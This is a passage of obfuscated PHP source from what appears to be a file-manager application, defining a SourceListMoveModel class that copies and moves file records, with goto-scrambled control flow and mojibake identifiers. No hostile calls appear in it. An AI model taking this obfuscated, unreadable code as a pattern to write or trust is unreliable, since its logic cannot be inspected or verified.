Ó«ØÚ == $aâ„”èáû†[106] ? $aâ„”èáû†[104] : $B¢Û Ó«ØÚ; goto Eê—ÆõíÛ⁄; dƒÜû˜‹É∂: return $AÁ¥õ©‡Û∑; goto f√¡ÜŒö£˘; f√¡ÜŒö£˘: } } class SourceListMoveModel extends SourceListModel { public function isParentOf($c’ÁìÇ«í‚, $F⁄¢–öïï˜) { goto DË∏ﬂ≠∑ö·; DË∏ﬂ≠∑ö·: $EæÃä¬æ“ë =& $_SERVER[∞„˜ƒÑºª]; $c“óèá§≈ô = $this->sourceInfo($c’ÁìÇ«í‚); $f÷çëóà·Ñ = $this->sourceInfo($F⁄¢–öïï˜); goto f‘ìéç‘Ìî; f‘ìéç‘Ìî: $c±ôçâ∞±¢ = $c“óèá§≈ô[$EæÃä¬æ“ë[373]] . $c“óèá§≈ô[$EæÃä¬æ“ë[374]] . $EæÃä¬æ“ë[47]; $Cπ≠˜àöÒø = $f÷çëóà·Ñ[$EæÃä¬æ“ë[373]] . $f÷çëóà·Ñ[$EæÃä¬æ“ë[374]] . $EæÃä¬æ“ë[47]; $C“Ò”çÑ´± = strpos($Cπ≠˜àöÒø, $c±ôçâ∞±¢) === 0; goto FÉÜ„Ï∑à≤; FÉÜ„Ï∑à≤: return $C“Ò”çÑ´±; goto cŒäâæ≥ Ç; cŒäâæ≥ Ç: } public function copy($e∂…∫É€ª√, $e∆≥·§èÜ•, $BÈ∑ÛäÌË√ = REPEAT_REPLACE, $bÖ‘øÓç£π = '') { goto d≈úŒ√ß≤‚; Dú…ŸËŒù‡: $B©÷ë´ï‡« = $this->fileNameExistCache($e∆≥·§èÜ•, $fÍüöçÑ…¨[$c¨·¥Ëüìñ[28]]); $fåÌ≥⁄ñ»’ = $this->_copy($e∂…∫É€ª√, $e∆≥·§èÜ•, $BÈ∑ÛäÌË√, $Aê¢ ∞¥ª¡, !0, $bÖ‘øÓç£π); $this->_childrenListClear(); goto FæÇñªè–¯; FæÇñªè–¯: if ($fÍüöçÑ…¨[$c¨·¥Ëüìñ[375]] == $c¨·¥Ëüìñ[376] && $B©÷ë´ï‡« == $fåÌ≥⁄ñ»’) { $this->folderSizeResetChildren($B©÷ë´ï‡«); } Model($c¨·¥Ëüìñ[380])->addAll($Aê¢ ∞¥ª¡[$c¨·¥Ëüìñ[378]], array(), !0); Model($c¨·¥Ëüìñ[381])->eventCopy($fåÌ≥⁄ñ»’); goto Bá•—∆ﬁ∑è; d≈úŒ√ß≤‚: $c¨·¥Ëüìñ =& $_SERVER[∞„˜ƒÑºª]; $fÍüöçÑ…¨ = $this->sourceInfo($e∂…∫É€ª√); $AÉà™ïóÍÂ = $this->sourceInfo($e∆≥·§èÜ•); goto cê„ì«ÇÉé; Bá•—∆ﬁ∑è: $this->saveAll($Aê¢ ∞¥ª¡[$c¨·¥Ëüìñ[379]]); Model($c¨·¥Ëüìñ[163])->linkAdd($Aê¢ ∞¥ª¡[$c¨·¥Ëüìñ[377]]); $this->folderSizeReset($e∆≥·§èÜ•); goto DµΩ¿√⁄˜∂; DµΩ¿√⁄˜∂: $this->updateModifyTime($e∆≥·§èÜ•); return $fåÌ≥⁄ñ»’; goto bòÑ¢º°ô˘; cê„ì«ÇÉé: if (!$fÍüöçÑ…¨ || !$AÉà™ïóÍÂ || $AÉà™ïóÍÂ[$c¨·¥Ëüìñ[375]] != $c¨·¥Ëüìñ[376]) { return !1; } if ($this->isParentOf($e∂…∫É€ª√, $e∆≥·§èÜ•)) { return !1; } $Aê¢ ∞¥ª¡ = array($c¨·¥Ëüìñ[377] => array(), $c¨·¥Ëüìñ[378] => array(), $c¨·¥Ëüìñ[379] => array()); goto Dú…ŸËŒù‡; bòÑ¢º°ô˘: } private function _copy($CÒ⁄˘Áõ√è, $E‘¬√•˜Öå, $dÛÉÉŸá’Ö, &$Cœ»æ≤êÑ∞, $B≤«ƒ›™ˆå, $aõ¬û¶òŒ◊ = '') { goto a™‹ÜêÏƒË; cù≠ª‚ÓÍÂ: if (!$A—ÔÀ‹Æ™µ) { return $this->_copyCreate($CÒ⁄˘Áõ√è, $E‘¬√•˜Öå, $fáöƒÎÊ‰•, $Cœ»æ≤êÑ∞); } $a‹©©ÉﬂŸ€ = $A—ÔÀ‹Æ™µ; if ($b§ï¡´É´¬) { if ($dÛÉÉŸá’Ö == REPEAT_RENAME_FOLDER) { $fáöƒÎÊ‰• = $this->fileNameAutoCache($E‘¬√•˜Öå, $fáöƒÎÊ‰•, $dÛÉÉŸá’Ö, $b§ï¡´É´¬); $a‹©©ÉﬂŸ€ = $this->_copyCreate($CÒ⁄˘Áõ√è, $E‘¬√•˜Öå, $fáöƒÎÊ‰•, $Cœ»æ≤êÑ∞); } else { $E∂Âæ•€∫å = $this->_childrenList($CÒ⁄˘Áõ√è); foreach ($E∂Âæ•€∫å as $c„¡åﬁ∆Üè) { $this->_copy($c„¡åﬁ∆Üè[$a∆°Í∂€˘[374]], $A—ÔÀ‹Æ™µ, $dÛÉÉŸá’Ö, $Cœ»æ≤êÑ∞, !1); } } } else { if ($dÛÉÉŸá’Ö == REPEAT_RENAME || $dÛÉÉŸá’Ö == REPEAT_RENAME_FOLDER) { $fáöƒÎÊ‰• = $this->fileNameAutoCache($E‘¬√•˜Öå, $fáöƒÎÊ‰•, $dÛÉÉŸá’Ö, $b§ï¡´É´¬); $a‹©©ÉﬂŸ€ = $this->_copyCreate($CÒ⁄˘Áõ√è, $E‘¬√•˜Öå, $fáöƒÎÊ‰•, $Cœ»æ≤êÑ∞); } else { if ($dÛÉÉŸá’Ö == REPEAT_REPLACE) { $Fäô⁄∑ÍÎç = $this->sourceInfoCache($A—ÔÀ‹Æ™µ); $Dø£Æ”‹≤ü = $this->fileHistory($Fäô⁄∑ÍÎç, $a‚åä”¶¡â[$a∆°Í∂€˘[382]], $a‚åä”¶¡â[$a∆°Í∂€˘[86]]); if ($Dø£Æ”‹≤ü) { $Cœ»æ≤êÑ∞[$a∆°Í∂€˘[377]][] = $a‚åä”¶¡â[$a∆°Í∂€˘[382]]; } } else { if ($dÛÉÉŸá’Ö == REPEAT_SKIP) { } } } } goto DÜõ±“®ìº; dπ¬µ„ß‰˘: $fáöƒÎÊ‰• = $aõ¬û¶òŒ◊ ? $aõ¬û¶òŒ◊ : $a‚åä”¶¡â[$a∆°Í∂€˘[28]]; $A—ÔÀ‹Æ™µ = $this->fileNameExistCache($E‘¬√•˜Öå, $fáöƒÎÊ‰•); if ($B≤«ƒ›™ˆå) { $this->_childrenAllMake($CÒ⁄˘Áõ√è); if ($b§ï¡´É´¬ && $A—ÔÀ‹Æ™µ) { $this->_childrenAllMake($A—ÔÀ‹Æ™µ); } } goto cù≠ª‚ÓÍÂ; a™‹ÜêÏƒË: $a∆°Í∂€˘ =& $_SERVER[∞„˜ƒÑºª]; $a‚åä”¶¡â = $this->sourceInfoCache($CÒ⁄˘Áõ√è); $b§ï¡´É´¬ = $a‚åä”¶¡â[$a∆°Í∂€˘[375]] == $a∆°Í∂€˘[376]; goto dπ¬µ„ß‰˘; DÜõ±“®ìº: return $a‹©©ÉﬂŸ€; goto b–®óıŸ©∑; b–®óıŸ©∑: } private function _copyCreate($d”ùçÁ’ç≠, $c…àœµÜ‰ì, $dæ¿ı∞Ÿä«, &$BÒ¢∫∑è∑Ì) { goto eËõ††ßíﬁ; eËõ††ßíﬁ: $f∂ŸÊ∫ßúñ =& $_SERVER[∞„˜ƒÑºª]; $AÂÃíëëﬁÕ = $this->sourceInfoCache($d”ùçÁ’ç≠); $Fˆ¶Ñåêêÿ = $this->sourceInfoCache($c…àœµÜ‰ì); goto a£≠©åä„¿; BáÜÆúúûà: if (count($AıˆàóÎ‰ü) == 0) { return $c∑í÷èì¨ı; } $Däú≤ˆ±ªæ = $this->sourceInfo($c∑í÷èì¨ı); foreach ($AıˆàóÎ‰ü as $cÿá–Ìòàº) { $AµÉÒóªäæ = $this->_makeItemData($cÿá–Ìòàº, $Däú≤ˆ±ªæ, $cÿá–Ìòàº[$f∂ŸÊ∫ßúñ[28]]); $AµÉÒóªäæ[$f∂ŸÊ∫ßúñ[373]] = $cÿá–Ìòàº[$f∂ŸÊ∫ßúñ[373]]; $DÚòÍÔÃ„™[] = $AµÉÒóªäæ; } goto fç…Ü„ß⁄Ë; dâ” éÜàÓ: $AıˆàóÎ‰ü = array(); $DÚòÍÔÃ„™ = array(); $this->_childrenListAll($d”ùçÁ’ç≠, $AıˆàóÎ‰ü); goto BáÜÆúúûà; F®ÿ–€û◊Ç: foreach ($FùóŸ™†ÿÀ as $cÿá–Ìòàº) { $FΩõ¡“§é = $cÿá–Ìòàº[$f∂ŸÊ∫ßúñ[374]]; $AãØˆÏ©ü° = $this->_childrenMatch($dÔÉ‘ÌåÊà, $cÿá–Ìòàº, $Däú≤ˆ±ªæ); $EŸÉë·É∏Ω[] = array($f∂ŸÊ∫ßúñ[374], $FΩõ¡“§é, $f∂ŸÊ∫ßúñ[384], $AãØˆÏ©ü°[$f∂ŸÊ∫ßúñ[384]]); $dﬁËë˘≤‰ó[] = array($f∂ŸÊ∫ßúñ[374], $FΩõ¡“§é, $f∂ŸÊ∫ßúñ[373], $AãØˆÏ©ü°[$f∂ŸÊ∫ßúñ[373]]); $this->_copyApplyMeta($cÿá–Ìòàº, $BÒ¢∫∑è∑Ì); if ($cÿá–Ìòàº[$f∂ŸÊ∫ßúñ[375]] != $f∂ŸÊ∫ßúñ[376]) { $BÒ¢∫∑è∑Ì[$f∂ŸÊ∫ßúñ[377]][] = $cÿá–Ìòàº[$f∂ŸÊ∫ßúñ[382]]; } } $this->saveAll($EŸÉë·É∏Ω); $this->saveAll($dﬁËë˘≤‰ó); goto d»óçıåé¨; d»óçıåé¨: return $c∑í÷èì¨ı; goto bÈÉÒ¥€Âñ; A€¢µõ⁄¿≤: $dÔÉ‘ÌåÊà[$d”ùçÁ’ç≠] = $c∑í÷èì¨ı; $EŸÉë·É∏Ω = array(); $dﬁËë˘≤‰ó = array(); goto F®ÿ–€û◊Ç; fç…Ü„ß⁄Ë: $this->addAll($DÚòÍÔÃ„™); $FùóŸ™†ÿÀ = $this->where(array($f∂ŸÊ∫ßúñ[384] => $c∑í÷èì¨ı))->select(); $dÔÉ‘ÌåÊà = $this->_childrenMakeRelation($AıˆàóÎ‰ü, $FùóŸ™†ÿÀ); goto A€¢µõ⁄¿≤; a£≠©åä„¿: $cÂæû∆§‘ù = $this->_makeItemData($AÂÃíëëﬁÕ, $Fˆ¶Ñåêêÿ, $dæ¿ı∞Ÿä«); Hook::trigger($f∂ŸÊ∫ßúñ[383], $cÂæû∆§‘ù); $c∑í÷èì¨ı = $this->add($cÂæû∆§‘ù); goto C›ò¿É¿¥õ; C›ò¿É¿¥õ: $Bπﬂè≤◊î∏ = array($f∂ŸÊ∫ßúñ[374] => $c∑í÷èì¨ı, $f∂ŸÊ∫ßúñ[28] => $dæ¿ı∞Ÿä«); $this->_copyApplyMeta($Bπﬂè≤◊î∏, $BÒ¢∫∑è∑Ì); if ($AÂÃíëëﬁÕ[$f∂ŸÊ∫ßúñ[375]] != $f∂ŸÊ∫ßúñ[376]) { $BÒ¢∫∑è∑Ì[$f∂ŸÊ∫ßúñ[377]][] = $AÂÃíëëﬁÕ[$f∂ŸÊ∫ßúñ[382]]; return $c∑í÷èì¨ı; } goto dâ” éÜàÓ; bÈÉÒ¥€Âñ: } private function _childrenMakeRelation($D¢Ñø®∞™Ú, $FÂÃô∑º È) { $F÷Â ◊óô» =& $_SERVER[∞„˜ƒÑºª]; $Eí≥à•‹Ú§ = array(); $FËá¯º¡Öê = array(); foreach ($D¢Ñø®∞™Ú as $C∞›éÜÃ›£) { $FÂ’∆êª∑¥ = $C∞›éÜÃ›£[$F÷Â ◊óô»[28]] . $F÷Â ◊óô»[8] . $C∞›éÜÃ›£[$F÷Â ◊óô»[373]]; $Eí≥à•‹Ú§[$FÂ’∆êª∑¥] = $C∞›éÜÃ›£[$F÷Â ◊óô»[374]]; } foreach ($FÂÃô∑º È as $C∞›éÜÃ›£) { $FÂ’∆êª∑¥ = $C∞›éÜÃ›£[$F÷Â ◊óô»[28]] . $F÷Â ◊óô»[8] . $C∞›éÜÃ›£[$F÷Â ◊óô»[373]]; $b÷¨ÒÑâ∆‚ = $Eí≥à•‹Ú§[$FÂ’∆êª∑¥]; $FËá¯º¡Öê[$b÷¨ÒÑâ∆‚] = $C∞›éÜÃ›£[$F÷Â ◊óô»[374]]; } return $FËá¯º¡Öê; } private function _childrenMatch($Aå≈Ø¡ö‰÷, $bÍ’’·–û´, $B⁄∫‡«¢◊€) { goto BÓﬁ∏∆≤†è; F◊°ıÂî»”: return array($cæê‡ª¨«›[384] => $C¬∏øíÿêÆ, $cæê‡ª¨«›[373] => $eÀﬂòµ⁄é); goto E√ÎıÈÉ ¯; BÓﬁ∏∆≤†è: $cæê‡ª¨«› =& $_SERVER[∞„˜ƒÑºª]; $eÀﬂòµ⁄é = $B⁄∫‡«¢◊€[$cæê‡ª¨«›[373]]; $eï•°÷ËÌÿ = $this->parentLevelArray($bÍ’’·–û´[$cæê‡ª¨«›[373]]); goto FåŸ¶Á“ùŒ; FåŸ¶Á“ùŒ: $C¬∏øíÿêÆ = $Aå≈Ø¡ö‰÷[$eï•°÷ËÌÿ[count($eï•°÷ËÌÿ) - 1]]; foreach ($eï•°÷ËÌÿ as $cƒ≥Ë·ﬂ¶á) { if (isset($Aå≈Ø¡ö‰÷[$cƒ≥Ë·ﬂ¶á])) { $eÀﬂòµ⁄é .= $Aå≈Ø¡ö‰÷[$cƒ≥Ë·ﬂ¶á] . $cæê‡ª¨«›[385]; } } $eÀﬂòµ⁄é = rtrim($eÀﬂòµ⁄é, $cæê‡ª¨«›[47]) . $cæê‡ª¨«›[47]; goto F◊°ıÂî»”; E√ÎıÈÉ ¯: } private function _makeItemData($Eˆã°å‰†±, $eÖÔ•Ëå¨´, $cåÆúê…¨Ê) { $EñÚß™ﬁâΩ =& $_SERVER[∞„˜ƒÑºª]; $Cé‹Ôà«∂Ì = array($EñÚß™ﬁâΩ[386] => $Eˆã°å‰†±[$EñÚß™ﬁâΩ[375]], $EñÚß™ﬁâΩ[387] => $cåÆúê…¨Ê, $EñÚß™ﬁâΩ[388] => $Eˆã°å‰†±[$EñÚß™ﬁâΩ[389]], $EñÚß™ﬁâΩ[390] => $Eˆã°å‰†±[$EñÚß™ﬁâΩ[382]], $EñÚß™ﬁâΩ[391] => $Eˆã°å‰†±[$EñÚß™ﬁâΩ[86]], $EñÚß™ﬁâΩ[392] => $eÖÔ•Ëå¨´[$EñÚß™ﬁâΩ[393]], $EñÚß™ﬁâΩ[394] => $eÖÔ•Ëå¨´[$EñÚß™ﬁâΩ[395]], $EñÚß™ﬁâΩ[396] => USER_ID, $EñÚß™ﬁâΩ[397] => USER_ID, $EñÚß™ﬁâΩ[398] => $eÖÔ•Ëå¨´[$EñÚß™ﬁâΩ[374]], $EñÚß™ﬁâΩ[399] => $eÖÔ•Ëå¨´[$EñÚß™ﬁâΩ[373]] . $eÖÔ•Ëå¨´[$EñÚß™ﬁâΩ[374]] . $EñÚß™ﬁâΩ[47], $EñÚß™ﬁâΩ[400] => 0); return $Cé‹Ôà«∂Ì; } private function _copyApplyMeta($EÆØÉÉõ©á, &$CÏéﬂπê˜Ì) { $AìÂëﬂπé– =& $_SERVER[∞„˜ƒÑºª]; $füÑ«™®—â = $EÆØÉÉõ©á[$AìÂëﬂπé–[374]]; $cä‡∑ïòé’ = $EÆØÉÉõ©á[$AìÂëﬂπé–[28]]; if (!isset($EÆØÉÉõ©á[$AìÂëﬂπé–[401]]) || !$EÆØÉÉõ©á[$AìÂëﬂπé–[401]] || $EÆØÉÉõ©á[$AìÂëﬂπé–[401]] == $AìÂëﬂπé–[402]) { $CÏéﬂπê˜Ì[$AìÂëﬂπé–[379]][] = array($AìÂëﬂπé–[374], $füÑ«™®—â, $AìÂëﬂπé–[401], short_id($füÑ«™®—â)); } if (Input::check($cä‡∑ïòé’, $AìÂëﬂπé–[403])) { $CÏéﬂπê˜Ì[$AìÂëﬂπé–[378]][] = array($AìÂëﬂπé–[374] => $füÑ«™®—â, $AìÂëﬂπé–[96] => $AìÂëﬂπé–[404], $AìÂëﬂπé–[357] => str_replace($AìÂëﬂπé–[50], $AìÂëﬂπé–[33], Pinyin::encode($cä‡∑ïòé’))); $CÏéﬂπê˜Ì[$AìÂëﬂπé–[378]][] = array($AìÂëﬂπé–[374] => $füÑ«™®—â, $AìÂëﬂπé–[96] => $AìÂëﬂπé–[405], $AìÂëﬂπé–[357] => Pinyin::encode($cä‡∑ïòé’, $AìÂëﬂπé–[406])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($bËÂºˆ»°◊) { goto EÚÑà•ª≥Í; F˜°€Éÿ¿√: $cóá≠«¨ê = array_to_keyvalue($cóá≠«¨ê, $AÚ˜Üá…íö[374]); foreach ($cóá≠«¨ê as $BÇ∆ÊàÉ…ë) { $dà÷ÎæÜÀù = $BÇ∆ÊàÉ…ë[$AÚ˜Üá…íö[384]]; $bËÂºˆ»°◊ = $BÇ∆ÊàÉ…ë[$AÚ˜Üá…íö[374]]; if (!isset($this->_childrenListCache[$bËÂºˆ»°◊]) && $BÇ∆ÊàÉ…ë[$AÚ˜Üá…íö[375]] == $AÚ˜Üá…íö[376]) { $this->_childrenListCache[$bËÂºˆ»°◊] = array(); } if (!isset($this->_childrenListCache[$dà÷ÎæÜÀù])) { $this->_childrenListCache[$dà÷ÎæÜÀù] = array(); } $this->_childrenListCache[$dà÷ÎæÜÀù][$bËÂºˆ»°◊] = $BÇ∆ÊàÉ…ë; $this->_childrenItemCache[$bËÂºˆ»°◊] = $BÇ∆ÊàÉ…ë; } goto FåÏçÉ∞§π; CÁÏÍÊ‘†Á: $EÜÍıÇ⁄‰ = array($AÚ˜Üá…íö[373] => array($AÚ˜Üá…íö[408], $A∑ˆ◊∞≠‹Ó[$AÚ˜Üá…íö[373]] . $bËÂºˆ»°◊ . $AÚ˜Üá…íö[409]), $AÚ˜Üá…íö[410] => 0); $cóá≠«¨ê = $this->field($B¬ÇÑÑÎãé)->where($EÜÍıÇ⁄‰)->select(); if (!$cóá≠«¨ê) { return; } goto F˜°€Éÿ¿√; EÚÑà•ª≥Í: $AÚ˜Üá…íö =& $_SERVER[∞„˜ƒÑºª]; $A∑ˆ◊∞≠‹Ó = $this->sourceInfo($bËÂºˆ»°◊); $B¬ÇÑÑÎãé = $AÚ˜Üá…íö[407]; goto CÁÏÍÊ‘†Á; FåÏçÉ∞§π: } private function _childrenListAll($D≠®≈üÃòÃ, &$B∑ÇÖ¨Ö´†) { $bÛπ◊ãÂ÷¶ =& $_SERVER[∞„˜ƒÑºª]; if (!isset($this->_childrenListCache[$D≠®≈üÃòÃ])) { return; } $C·„êÇŒÀ˜ = $this->_childrenListCache[$D≠®≈üÃòÃ]; foreach ($C·„êÇŒÀ˜ as $EΩüÙ†Ñ¶ä => $A˘µ÷Çªÿı) { $B∑ÇÖ¨Ö´†[$EΩüÙ†Ñ¶ä] = $A˘µ÷Çªÿı; if ($A˘µ÷Çªÿı[$bÛπ◊ãÂ÷¶[375]] == $bÛπ◊ãÂ÷¶[376]) { $this->_childrenListAll($EΩüÙ†Ñ¶ä, $B∑ÇÖ¨Ö´†); } } } private function sourceInfoCache($dÑﬂÜ€Ôﬂæ) { if (isset($this->_childrenItemCache[$dÑﬂÜ€Ôﬂæ])) { return $this->_childrenItemCache[$dÑﬂÜ€Ôﬂæ]; } return $this->sourceInfo($dÑﬂÜ€Ôﬂæ); } private function _childrenList($D†É¶◊·ÎŸ) { if (isset($this->_childrenListCache[$D†É¶◊·ÎŸ])) { return $this->_childrenListCache[$D†É¶◊·ÎŸ]; } return $this->_childrenListSelect($D†É¶◊·ÎŸ); } private function _childrenListSelect($c‚¡Ë’¯ë–) { goto d›‚Ë‹ÒÀ¨; dç¨Ñ◊ùä£: foreach ($c§∞·É££µ as $c‚¡Ë’¯ë– => $bÏÀÎ¢‘ó’) { $this->_childrenItemCache[$c‚¡Ë’¯ë–] = $bÏÀÎ¢‘ó’; } return $c§∞·É££µ; goto BîÓÖπæ‹è; AÌ¶£›Ü’: $c…ÖÖ›áÛ± = $c…ÖÖ›áÛ± ? $c…ÖÖ›áÛ± : array(); $c§∞·É££µ = array_to_keyvalue($c…ÖÖ›áÛ±, $eñë≈µÈµ«[374]); $this->_childrenListCache[$c‚¡Ë’¯ë–] = $c§∞·É££µ; goto dç¨Ñ◊ùä£; d›‚Ë‹ÒÀ¨: $eñë≈µÈµ« =& $_SERVER[∞„˜ƒÑºª]; $B≠›ﬁ¢ì‰ = array($eñë≈µÈµ«[384] => $c‚¡Ë’¯ë–, $eñë≈µÈµ«[410] => 0); $c…ÖÖ›áÛ± = $this->where($B≠›ﬁ¢ì‰)->select(); goto AÌ¶£›Ü’; BîÓÖπæ‹è: } private function fileNameExistCache($FÍãŸﬁäÿ›, $e¿∆Â€´∏Û) { $DŸÊ®—Ô”Ö =& $_SERVER[∞„˜ƒÑºª]; $e¿∆Â€´∏Û = strtolower($e¿∆Â€´∏Û); $CäıﬁÊ ë÷ = $this->_childrenList($FÍãŸﬁäÿ›); foreach ($CäıﬁÊ ë÷ as $Eµ„–‚Û‹‰) { if ($e¿∆Â€´∏Û == strtolower($Eµ„–‚Û‹‰[$DŸÊ®—Ô”Ö[28]])) { return $Eµ„–‚Û‹‰[$DŸÊ®—Ô”Ö[374]]; } } return !1; } private function fileNameAutoCache($B√™›“˜Êì, $Cµ¢ƒ–Â¶¬, $CùÒ“ßŒô, $c¶üëäÉ”Ü) { $Dÿ≠Ñ¬ÂÉ– =& $_SERVER[∞„˜ƒÑºª]; $Aä⁄°èÖï∂ = $this->_childrenList($B√™›“˜Êì); $Fø¯ä∆ê∏ß = array_to_keyvalue($Aä⁄°èÖï∂, $Dÿ≠Ñ¬ÂÉ–[33], $Dÿ≠Ñ¬ÂÉ–[28]); return $this->fileNameAutoGet($Fø¯ä∆ê∏ß, $Cµ¢ƒ–Â¶¬, $CùÒ“ßŒô, $c¶üëäÉ”Ü); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Eê“æí…˜í, $Fâ≥—»ø¶è, $d‰íâÓ·‚® = REPEAT_REPLACE, $bˆá®Éû≤∆ = '') { goto cé√™â¶ç’; Aî€“èäËÏ: if (!$dÇŒƒõ•˜É || !$a—æÚˆñ”ä || $a—æÚˆñ”ä[$B©ÍÏ˘˘⁄°[375]] != $B©ÍÏ˘˘⁄°[376] || $dÇŒƒõ•˜É[$B©ÍÏ˘˘⁄°[384]] == $Fâ≥—»ø¶è) { return !1; } if ($this->isParentOf($Eê“æí…˜í, $Fâ≥—»ø¶è)) { return !1; } $fåŒ˜Øà∏◊ = array($B©ÍÏ˘˘⁄°[377] => array(), $B©ÍÏ˘˘⁄°[411] => !1); goto D ˆÀëÉå ; cé√™â¶ç’: $B©ÍÏ˘˘⁄° =& $_SERVER[∞„˜ƒÑºª]; $dÇŒƒõ•˜É = $this->sourceInfo($Eê“æí…˜í); $a—æÚˆñ”ä = $this->sourceInfo($Fâ≥—»ø¶è); goto Aî€“èäËÏ; B‹≈üª◊ÀØ: Model($B©ÍÏ˘˘⁄°[381])->eventMove($Eê“æí…˜í, $dÇŒƒõ•˜É[$B©ÍÏ˘˘⁄°[384]], $Fâ≥—»ø¶è); return $F»Èç±åﬂê; goto B™µÑ§Œﬂë; d¢œ±≈ºƒå: $this->sourceCacheClear(); if ($dÇŒƒõ•˜É[$B©ÍÏ˘˘⁄°[375]] == $B©ÍÏ˘˘⁄°[376] && $F«ÌÇ¥Ñ¡ú) { $this->folderSizeResetChildren($F»Èç±åﬂê); } Model($B©ÍÏ˘˘⁄°[163])->linkAdd($fåŒ˜Øà∏◊[$B©ÍÏ˘˘⁄°[377]]); goto B¢ÁÉÆ‡∆·; D ˆÀëÉå : $this->clearShare($Eê“æí…˜í, $Fâ≥—»ø¶è); $F«ÌÇ¥Ñ¡ú = $this->fileNameExistCache($Fâ≥—»ø¶è, $dÇŒƒõ•˜É[$B©ÍÏ˘˘⁄°[28]]); $F»Èç±åﬂê = $this->_move($Eê“æí…˜í, $Fâ≥—»ø¶è, $d‰íâÓ·‚®, $fåŒ˜Øà∏◊, $bˆá®Éû≤∆); goto d¢œ±≈ºƒå; e“ûË±Çﬁ‹: $a·ùÖà·¢Ñ = array($dÇŒƒõ•˜É[$B©ÍÏ˘˘⁄°[384]], $Fâ≥—»ø¶è); if ($dÇŒƒõ•˜É[$B©ÍÏ˘˘⁄°[375]] == $B©ÍÏ˘˘⁄°[376]) { $a·ùÖà·¢Ñ[] = $Eê“æí…˜í; } $this->updateModifyTime($a·ùÖà·¢Ñ); goto B‹≈üª◊ÀØ; B¢ÁÉÆ‡∆·: if ($F«ÌÇ¥Ñ¡ú && $fåŒ˜Øà∏◊[$B©ÍÏ˘˘⁄°[411]]) { $this->remove($Eê“æí…˜í, !1); } $this->folderSizeReset($dÇŒƒõ•˜É[$B©ÍÏ˘˘⁄°[384]]); $this->folderSizeReset($Fâ≥—»ø¶è); goto e“ûË±Çﬁ‹; B™µÑ§Œﬂë: } private function _move($fÃüﬁ∏üüå, $AÙˆÊÇÉÒ¨, $Aèﬂ⁄Ê√ùÑ, &$BôÌ™éÿÓÆ, $C˜Úäœ∑¢† = '') { goto cËŸØ›Êßâ; d∑”…Úüº…: if ($F‹‰ê‚ñŸ– && !$BôÌ™éÿÓÆ[$CƒÍô∏ê“◊[411]]) { $BôÌ™éÿÓÆ[$CƒÍô∏ê“◊[411]] = !0; } return $FÚûÑÎÂø‰; goto d≤∑˘ﬂº…â; cÉÏ∫öâ¯˜: $FÚûÑÎÂø‰ = $d∂ı√Œﬁ§Ê; $F‹‰ê‚ñŸ– = !1; if ($bê—∆Ìâ⁄Æ) { if ($Aèﬂ⁄Ê√ùÑ == REPEAT_RENAME_FOLDER) { $D…ã•´ÍÑç = $this->fileNameAuto($AÙˆÊÇÉÒ¨, $D…ã•´ÍÑç, $Aèﬂ⁄Ê√ùÑ, $bê—∆Ìâ⁄Æ); $FÚûÑÎÂø‰ = $this->_moveForce($fÃüﬁ∏üüå, $AÙˆÊÇÉÒ¨, $D…ã•´ÍÑç); } else { if ($Aèﬂ⁄Ê√ùÑ == REPEAT_RENAME_FOLDER) { $Aèﬂ⁄Ê√ùÑ = REPEAT_RENAME; } $C⁄áäçµ“µ = $this->_childrenListSelect($fÃüﬁ∏üüå); foreach ($C⁄áäçµ“µ as $eˆ…√‡∏∏Ñ) { $this->_move($eˆ…√‡∏∏Ñ[$CƒÍô∏ê“◊[374]], $d∂ı√Œﬁ§Ê, $Aèﬂ⁄Ê√ùÑ, $BôÌ™éÿÓÆ); } $F‹‰ê‚ñŸ– = !0; } } else { if ($Aèﬂ⁄Ê√ùÑ == REPEAT_SKIP) { $F‹‰ê‚ñŸ– = !0; } else { if ($Aèﬂ⁄Ê√ùÑ == REPEAT_RENAME || $Aèﬂ⁄Ê√ùÑ == REPEAT_RENAME_FOLDER) { $D…ã•´ÍÑç = $this->fileNameAuto($AÙˆÊÇÉÒ¨, $D…ã•´ÍÑç, $Aèﬂ⁄Ê√ùÑ, $bê—∆Ìâ⁄Æ); $FÚûÑÎÂø‰ = $this->_moveForce($fÃüﬁ∏üüå, $AÙˆÊÇÉÒ¨, $D…ã•´ÍÑç); } else { if ($Aèﬂ⁄Ê√ùÑ == REPEAT_REPLACE) { $fŸÌÈú»«≈ = $this->sourceInfoCache($d∂ı√Œﬁ§Ê); $E›íÇä≥Ç· = $this->fileHistory($fŸÌÈú»«≈, $Eêÿä•“„À[$CƒÍô∏ê“◊[382]], $Eêÿä•“„À[$CƒÍô∏ê“◊[86]]); if ($E›íÇä≥Ç·) { $BôÌ™éÿÓÆ[$CƒÍô∏ê“◊[377]][] = $Eêÿä•“„À[$CƒÍô∏ê“◊[382]]; } else { $F‹‰ê‚ñŸ– = !0; } } } } } goto d∑”…Úüº…; AÂÍ≠‰ßˆû: $D…ã•´ÍÑç = $C˜Úäœ∑¢† ? $C˜Úäœ∑¢† : $Eêÿä•“„À[$CƒÍô∏ê“◊[28]]; $d∂ı√Œﬁ§Ê = $this->fileNameExistCache($AÙˆÊÇÉÒ¨, $D…ã•´ÍÑç); if (!$d∂ı√Œﬁ§Ê) { return $this->_moveForce($fÃüﬁ∏üüå, $AÙˆÊÇÉÒ¨, $D…ã•´ÍÑç); } goto cÉÏ∫öâ¯˜; cËŸØ›Êßâ: $CƒÍô∏ê“◊ =& $_SERVER[∞„˜ƒÑºª]; $Eêÿä•“„À = $this->sourceInfo($fÃüﬁ∏üüå); $bê—∆Ìâ⁄Æ = $Eêÿä•“„À[$CƒÍô∏ê“◊[375]] == $CƒÍô∏ê“◊[376]; goto AÂÍ≠‰ßˆû; d≤∑˘ﬂº…â: } private function _moveForce($Fµ ∆∆«œ¿, $aˆõ´¿Ò◊Ã, $D‡—ßÚŸÀº) { goto B—Î—Õ¯èÑ; fÉÁﬂ∞îòä: $EãïµçÜÉã = $E¯Ù¯“à´∏[$bõ¿ö¡”≈¶[375]] == $bõ¿ö¡”≈¶[376]; $B©úîËø≠ﬂ = array($bõ¿ö¡”≈¶[398] => $FêÈﬂ†Í¢π[$bõ¿ö¡”≈¶[374]], $bõ¿ö¡”≈¶[399] => $FêÈﬂ†Í¢π[$bõ¿ö¡”≈¶[373]] . $FêÈﬂ†Í¢π[$bõ¿ö¡”≈¶[374]] . $bõ¿ö¡”≈¶[47], $bõ¿ö¡”≈¶[392] => 